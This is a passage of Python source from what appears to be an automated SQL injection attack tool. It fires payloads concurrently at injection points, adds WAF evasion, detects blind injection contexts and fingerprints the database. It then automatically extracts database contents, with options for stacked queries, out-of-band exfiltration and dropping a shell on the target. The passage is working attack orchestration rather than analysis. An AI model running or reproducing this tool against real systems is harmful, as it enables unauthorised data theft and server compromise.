        return []

    sem = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)
    tasks = [test_payload_task(session, p, payload, limiter, base_errors, sem,
                               jar=jar, evade=evade,
                               baseline_len=baseline_len, verbose=verbose)
             for p in points for payload in PAYLOADS]
    results = await asyncio.gather(*tasks, return_exceptions=True)

    findings, seen, vuln = [], set(), {}
    for r in results:
        if isinstance(r, Exception) or not r:
            continue
        k = (r["injection_kind"], r["parameter"])
        if k in seen:
            continue
        seen.add(k)
        findings.append(r)
        vuln.setdefault((r["injection_kind"], r["parameter"]), r)
        if verbose:
            mut = f" (mut={r['mutation_used']})" if "mutation_used" in r else ""
            success(f"SQLi candidate: {r['injection_kind']} "
                    f"{r['parameter']!r}{mut}")

    if auto_extract and blind_probe:
        for p in points:
            if (p.kind, p.name) in vuln:
                continue
            ctx_name, wrap, oracle_kind, oracle_state = await detect_context(
                session, p, limiter, DEFAULT_DIALECT, jar=jar,
                verbose=verbose, evade=evade, baseline_len=baseline_len)
            if ctx_name is None:
                continue

            blind_dbms = await fingerprint_blind_dbms(
                session, p, wrap, limiter, oracle_kind, oracle_state,
                jar=jar, verbose=verbose, baseline_len=baseline_len)
            if blind_dbms is None:
                blind_dbms = DEFAULT_DIALECT
                if verbose:
                    warn(f"could not fingerprint DBMS for {p.name!r}; "
                         f"falling back to {DEFAULT_DIALECT}")

            finding = {
                "type": "sqli", "severity": "high",
                "url": p.url, "parameter": p.name,
                "injection_kind": p.kind, "method": p.method,
                "payload": f"context={ctx_name}",
                "http_status": 200,
                "dbms": blind_dbms,
                "evidence": f"blind oracle: context={ctx_name} kind={oracle_kind}",
            }
            findings.append(finding)
            vuln[(p.kind, p.name)] = finding
            if verbose:
                success(f"blind SQLi candidate: {p.kind} {p.name!r} "
                        f"(context={ctx_name}, dbms={blind_dbms})")

    if auto_extract and vuln:
        for (kind, name), sample in vuln.items():
            point = next(p for p in points if p.kind == kind and p.name == name)
            dbms = sample.get("dbms") or DEFAULT_DIALECT
            if dbms == "generic":
                dbms = DEFAULT_DIALECT
            for f in findings:
                if f["injection_kind"] == kind and f["parameter"] == name:
                    f["extraction_attempted"] = True
            try:
                assets = await extract_vulnerable_database_assets(
                    session, point, limiter, dbms, jar=jar, verbose=verbose,
                    allow_stacked=allow_stacked, evade=evade,
                    baseline_len=baseline_len, baseline_hash=baseline_hash,
                    oob_config=oob_config,
                    want_shell=drop_shell,
                    aggressive=aggressive)
                for f in findings:
                    if f["injection_kind"] == kind and f["parameter"] == name:
                        if assets:
                            f["extracted_data"] = assets
                        else:
                            f["extraction_failed"] = True
            except Exception as e:
                warn(f"extraction failed for {kind}:{name!r}: "
                     f"{type(e).__name__}: {e!r}")
                for f in findings:
                    if f["injection_kind"] == kind and f["parameter"] == name:
                        f["extraction_error"] = f"{type(e).__name__}: {e}"

    for f in findings:
        if (f.get("extraction_attempted")
                and not f.get("extracted_data")
                and f.get("type") != "csrf_tokens"):
            f["severity"] = "medium"
            f["note"] = ("injection confirmed, extraction failed "
                         "(blind, WAF-blocked, or out-of-band only)")

    deduped = {}
    for f in findings:
        if f.get("type") == "csrf_tokens":
            continue
        if f.get("injection_kind") == "body":
            key = ("body", f.get("method"), f.get("url"))
        else:
            key = (f.get("injection_kind"), f.get("method"),
                   f.get("url"), f.get("parameter"))
        existing = deduped.get(key)
        if existing is None:
            deduped[key] = f
        elif f.get("extracted_data") and not existing.get("extracted_data"):
            deduped[key] = f
    findings = list(deduped.values())

    if jar:
        findings.append({
            "type": "csrf_tokens",
            "note": "tokens were cached during the scan",
            "tokens": sorted(jar.tokens.keys()),
        })

    return findings